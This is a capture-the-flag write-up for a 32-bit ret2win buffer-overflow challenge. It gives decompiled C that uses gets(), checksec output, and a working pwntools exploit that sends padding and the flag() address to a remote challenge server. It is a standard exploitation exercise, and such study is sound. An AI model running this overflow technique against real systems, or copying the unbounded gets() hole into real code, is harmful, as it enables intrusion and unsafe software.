# OverFlow 1

## Reverse 
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void vuln(void) {
    char buf[68]; // Buffer to store user input

    // Get user input without bounds checking (unsafe)
    gets(buf);

    // Print a message with a placeholder for an address
    printf("Woah, were jumping to 0x%x !\n", flag);
}

int main(void) {
    __gid_t __rgid;

    // Set the buffer mode for stdout to line buffering
    setvbuf(stdout, NULL, _IOLBF, 0);

    // Get the effective group ID
    __rgid = getegid();

    // Set the real, effective, and saved group ID to the effective group ID
    setresgid(__rgid, __rgid, __rgid);

    // Prompt the user for input
    puts("Give me a string and lets see what happens: ");

    // Call the vulnerable function
    vuln();

    return 0;
}
```

## Checksec

```sh
❯ checksec vuln
[*] '/home/jiuhao/workspace/ucas-ctf/pwn/PA_OverFlow1/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

可知栈不可执行，需要利用程序内函数

## Exploit

分析可知运行时打印出了`flag`函数的地址，我们可以利用`gets`函数的缓冲区溢出漏洞，覆盖返回地址为`flag`函数的地址，进而执行`flag`函数。

利用脚本如下

```python
#!/usr/bin/python
from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51002)
# r = process("./vuln")
r.recvuntil(b"Give me a string and lets see what happens: ")
flag_function_addr = 0x080491F6
buf_len = 0x44
ebx_offset = 0x4
ebp_offset = 0x4
padding_len = buf_len + ebx_offset + ebp_offset
r.sendline(b"A" * padding_len + p64(flag_function_addr))
r.interactive()
```
